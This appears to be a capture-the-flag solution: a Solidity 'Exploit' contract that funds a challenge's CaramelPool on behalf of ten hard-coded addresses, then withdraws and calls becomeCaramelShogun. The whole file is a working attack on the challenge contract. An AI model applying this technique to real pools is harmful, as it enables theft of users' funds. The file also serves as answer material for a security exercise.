// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "public/Setup.sol";

contract Exploit {

    constructor(Setup _setup) {
        CaramelPool caramelPool = _setup.caramelPool();

        address[10] memory _depositors = [
            0x0136439830E1AbE0296b764691eB3fC296D145BF,
            0x122E53F0444aC267371a0cf63d15cd782D8BB1c6,
            0x00000000219ab540356cBB839Cbe05303d7705Fa,
            0x4452552736041BCC3FE0F35647e56F2C4fdf956E,
            0x0001E0515Bc0B5c2df1abC2842b42b29994f44d0,
            0x97eebf4908c5C08EB09196579fC6451585D1b9A6,
            0x1352CB6CCeC784dD765AC55F0413cadFA4946Cfd,
            0x14db6558F0dfcD940dAe566C20F694D2F0454Ca8,
            0x13182312eED5A75D62e45B726B63639b6a8F25bc,
            0x1337CEE91653179667C33AffDBC28264c50C40b0
        ];

        for (uint i = 0; i < 10; i++) {
            caramelPool.fundPool(_depositors[i]);
        }

        caramelPool.withdrawFromPool();
        caramelPool.becomeCaramelShogun();
    }
}